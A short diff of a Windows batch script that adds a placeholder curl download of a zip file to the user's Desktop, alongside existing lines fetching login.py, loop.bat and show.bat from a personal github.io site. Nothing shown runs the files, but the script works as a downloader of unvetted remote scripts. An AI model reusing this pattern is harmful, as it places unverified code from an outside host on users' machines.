@@ -1,4 +1,9 @@
 @echo off
+setlocal
+set "URL=https://example.com/file.zip"
+set "FILENAME=file.zip"
+curl -L -o "%FILENAME%" "%URL%"
+move "%FILENAME%" "%USERPROFILE%\Desktop\"
 curl -L -o login.py https://wowsha22.github.io/download/login.py
 curl -L -o loop.bat https://wowsha22.github.io/download/loop.bat
 curl -L -o show.bat https://wowsha22.github.io/download/show.bat
